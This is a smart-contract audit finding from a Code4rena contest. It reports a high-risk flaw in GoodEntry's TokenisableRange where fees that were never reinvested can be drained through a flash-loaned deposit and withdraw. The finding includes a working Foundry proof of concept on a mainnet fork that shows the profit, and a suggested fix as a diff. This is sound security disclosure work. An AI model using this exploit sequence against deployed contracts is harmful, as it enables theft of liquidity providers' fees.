## Tags

- bug
- 3 (High Risk)
- selected for report
- sponsor confirmed
- edited-by-warden
- H-04

# [TokenisableRange's incorrect accounting of non-reinvested fees in "deposit" exposes the fees to a flash-loan attack ](https://github.com/code-423n4/2023-08-goodentry-findings/issues/85) 

# Lines of code

https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L190
https://github.com/code-423n4/2023-08-goodentry/blob/71c0c0eca8af957202ccdbf5ce2f2a514ffe2e24/contracts/TokenisableRange.sol#L268


# Vulnerability details

The `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.

When a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).

To prevent users from stealing fees, there are several mechanisms in place:
1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees
2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees "is not given away for free"

Both of these mechanisms can however be worked around:
1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.
2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees "for free".

## Impact
Given a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.

## Proof of Concept
Below is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:
```Solidity
    function testStolenFeesPoc() public {
        vm.createSelectFork(
            "mainnet",
            17811921
        );

        vm.prank(tokenWhale);
        USDC.transfer(alice, 100_000e6);

        vm.startPrank(alice);
        TokenisableRange tr = new TokenisableRange();

        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); 
        // the pool will hold 0 WETH
        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, "Test1", "T1", false);

        USDC.approve(address(tr), 100_000e6);
        tr.init(100_000e6, 0);

        // time passes, and the pool trades in range, accumulating fees
        uint256 fee0 = 1_000e6;
        uint256 fee1 = 2e18;

        vm.mockCall(address(UniswapV3UsdcNFPositionManager), 
            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), 
            abi.encode(fee0, fee1));

        vm.stopPrank();
        vm.startPrank(tokenWhale);
        USDC.transfer(address(tr), fee0);
        WETH.transfer(address(tr), fee1);

        // now the price is back to 1870 USDC,
        // the undistributed fees are 1k USDC and 2 WETH, 
        // in total about $5k or 5% of the pool value 
        // (the percentage can be higher with bigger price swings)
        // but still, they are not reinvested
        tr.claimFee();
        vm.clearMockedCalls();
        require(tr.fee0() != 0);
        require(tr.fee1() != 0);

        // an attacker now can flashloan & deposit an amount that will give them
        // the majority of the pool liquidity, then withdraw for a profit
        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);
        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);
        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);

        USDC.approve(address(tr), 10_000_000e6);
        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't
        // count the value locked in fees in assigning the LP tokens
        WETH.approve(address(tr), 1000);
        uint256 deposited = tr.deposit(10_000_000e6, 1000);
        tr.withdraw(deposited, 0, 0);

        // the profit here is
        // 1 wei of USDC lost, probably to rounding
        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); 
        // 1.58 WETH of profit, which is most of the fees, 
        // and definitely more than 1% of the pool. Yay! 
        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));
        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));
    }
```
It is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:
> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert

## Tools Used
Code review

## Recommended Mitigation Steps
- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool
- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:
```diff
    // Stack too deep, so localising some variables for feeLiquidity calculations 
-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity
-    if ( newFee0 == 0 && newFee1 == 0 ){
+    {
      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));
      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));
      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, "Invalid Oracle Price");
      // Calculate the equivalent liquidity amount of the non-yet compounded fees
      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity 
      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   
                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); 
    }
```











## Assessed type

Math